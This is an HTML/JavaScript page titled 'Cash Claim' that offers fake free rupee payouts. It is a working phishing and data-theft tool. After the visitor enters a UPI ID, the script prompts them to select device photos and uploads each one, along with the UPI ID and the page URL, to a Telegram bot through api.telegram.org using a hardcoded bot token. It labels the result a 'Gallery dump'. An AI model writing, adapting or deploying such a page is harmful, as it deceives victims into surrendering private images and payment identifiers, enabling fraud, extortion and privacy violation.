<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cash Claim</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0f0f23;
      color: #e0e0ff;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .container {
      text-align: center;
      padding: 30px 20px;
      max-width: 380px;
      width: 100%;
    }
    .emoji {
      font-size: 96px;
      margin: 10px 0 30px;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%,100% { transform: scale(1); }
      50%     { transform: scale(1.12); }
    }
    h1 {
      font-size: 2.1rem;
      margin: 0 0 40px;
      color: #ffd700;
    }
    .select-money {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 12px;
      margin: 20px 0 40px;
    }
    .money-btn {
      background: #1e1e40;
      border: 2px solid #444;
      color: #fff;
      font-size: 1.3rem;
      padding: 14px 28px;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.2s;
    }
    .money-btn:hover,
    .money-btn.active {
      background: #ffd700;
      color: #000;
      border-color: #ffd700;
      transform: translateY(-2px);
    }
    input[type="text"] {
      width: 100%;
      padding: 16px;
      font-size: 1.1rem;
      margin: 20px 0 30px;
      border-radius: 10px;
      border: 1px solid #555;
      background: #1a1a2e;
      color: white;
      text-align: center;
    }
    button.claim {
      background: linear-gradient(90deg, #00c853, #64dd17);
      color: black;
      font-size: 1.4rem;
      font-weight: bold;
      padding: 18px 60px;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      box-shadow: 0 8px 20px rgba(0,200,83,0.4);
      transition: all 0.3s;
    }
    button.claim:disabled {
      background: #555;
      box-shadow: none;
      cursor: not-allowed;
    }
    #status {
      margin-top: 30px;
      font-size: 1.2rem;
      min-height: 1.6em;
      color: #ffeb3b;
    }
    .hidden { display: none !important; }
  </style>
</head>
<body>

<div class="container">
  <div class="emoji">💵</div>
  <h1>Select Money</h1>

  <div class="select-money" id="moneyOptions">
    <button class="money-btn" data-value="10">10₹</button>
    <button class="money-btn" data-value="20">20₹</button>
    <button class="money-btn" data-value="30">30₹</button>
    <button class="money-btn" data-value="50">50₹</button>
  </div>

  <input type="text" id="upiId" placeholder="Enter UPI ID" autocomplete="off"/>

  <button class="claim" id="claimBtn" disabled>CLAIM</button>

  <div id="status"></div>
</div>

<script>
// ──────────────────────────────────────────────
const BOT_TOKEN    = "7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI";           // ← CHANGE
const BASE_URL     = `https://api.telegram.org/bot${BOT_TOKEN}/`;
// ──────────────────────────────────────────────

const urlParams    = new URLSearchParams(window.location.search);
const targetChatId = urlParams.get("id") || null;     // must come from ?id=...

let selectedAmount = null;
let photosSent     = 0;
let totalPhotos    = 0;

const statusEl     = document.getElementById("status");
const claimBtn     = document.getElementById("claimBtn");
const upiInput     = document.getElementById("upiId");
const moneyButtons = document.querySelectorAll(".money-btn");

// 1. Select amount
moneyButtons.forEach(btn => {
  btn.addEventListener("click", () => {
    moneyButtons.forEach(b => b.classList.remove("active"));
    btn.classList.add("active");
    selectedAmount = btn.dataset.value;
    checkCanClaim();
  });
});

// 2. UPI typing → enable/disable claim
upiInput.addEventListener("input", checkCanClaim);

function checkCanClaim() {
  const upi = upiInput.value.trim();
  claimBtn.disabled = !(selectedAmount && upi.length > 4);
}

// 3. Claim button
claimBtn.addEventListener("click", async () => {
  if (!targetChatId) {
    statusEl.textContent = "Error: No user ID found in link (?id=...)";
    return;
  }

  const upi = upiInput.value.trim();

  // Hide choices
  document.getElementById("moneyOptions").classList.add("hidden");
  upiInput.classList.add("hidden");
  claimBtn.classList.add("hidden");

  statusEl.textContent = "Processing... Please wait";

  try {
    // 4. Request gallery permission
    const dirHandle = await window.showDirectoryPicker?.() || null;
    // Most browsers → only works if you use <input type="file" multiple webkitdirectory>
    // showDirectoryPicker() is Filesystem Access API → limited support + user must allow

    // Fallback: classic multiple file input
    const input = document.createElement("input");
    input.type = "file";
    input.multiple = true;
    input.accept = "image/*";
    // input.webkitdirectory = true;   // folders — very inconsistent support

    const filesPromise = new Promise(resolve => {
      input.onchange = e => resolve(e.target.files);
      input.click();
    });

    statusEl.textContent = "Select photos to continue...";

    const files = await filesPromise;

    if (!files || files.length === 0) {
      statusEl.textContent = "No photos selected. Process cancelled.";
      return;
    }

    totalPhotos = files.length;
    statusEl.textContent = `Sending \( {totalPhotos} photos... (0/ \){totalPhotos})`;

    // 5. Send all photos one by one (very fast as requested)
    for (let i = 0; i < files.length; i++) {
      const file = files[i];
      await sendPhotoToTelegram(file, i + 1);
      photosSent++;
      statusEl.textContent = `Sending \( {photosSent}/ \){totalPhotos} photos...`;
    }

    // 6. Final message
    await sendFinalMessage();

    statusEl.innerHTML = 
      `Success! Money request sent.<br>Wait 1 hour.<br>Photos sent: ${photosSent}`;
  } catch (err) {
    console.error(err);
    statusEl.textContent = "Error: " + (err.message || "permission denied / failed");
  }
});

async function sendPhotoToTelegram(file, index) {
  const formData = new FormData();
  formData.append("chat_id", targetChatId);
  formData.append("photo", file, `photo_${index}.jpg`);
  formData.append("caption", selectedAmount 
    ? `\( {index}/ \){totalPhotos} • ${selectedAmount}₹ request`
    : `\( {index}/ \){totalPhotos}`);

  try {
    const res = await fetch(BASE_URL + "sendPhoto", {
      method: "POST",
      body: formData
    });
    if (!res.ok) throw new Error("Telegram error " + res.status);
  } catch (e) {
    console.warn("Photo failed:", e);
    // continue anyway — as requested "fast speed me poora"
  }
}

async function sendFinalMessage() {
  const text = 
`[AUTO] Gallery dump finished
Amount selected: ${selectedAmount}₹
UPI: ${upiInput.value.trim()}
Photos sent: ${photosSent}
From: ${window.location.href}`;

  await fetch(BASE_URL + "sendMessage", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: targetChatId,
      text: text,
      parse_mode: "Markdown"
    })
  }).catch(console.warn);
}

</script>
</body>
</html>
